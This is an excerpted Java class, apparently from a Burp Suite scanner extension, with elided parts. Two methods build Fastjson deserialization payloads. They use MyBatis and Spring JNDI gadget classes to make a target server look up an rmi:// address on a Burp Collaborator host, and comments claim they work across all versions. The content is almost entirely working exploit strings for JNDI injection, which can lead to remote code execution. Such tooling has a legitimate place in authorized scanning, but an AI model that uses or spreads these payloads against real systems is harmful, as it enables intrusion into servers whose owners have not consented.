...
public class FastJson {
    ...
    public static void JndiDataSourceFactory() {
        ...
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String poc = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://"+ val +"/name\"}}";
    ...
    public static void SimpleJndiBeanFactory() {
        ...
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String poc = "Set [{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":[\"rmi://"+val+"/name\"]},\"adviceBeanName\":\"rmi://"+ val +"/name\"},{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",}]";
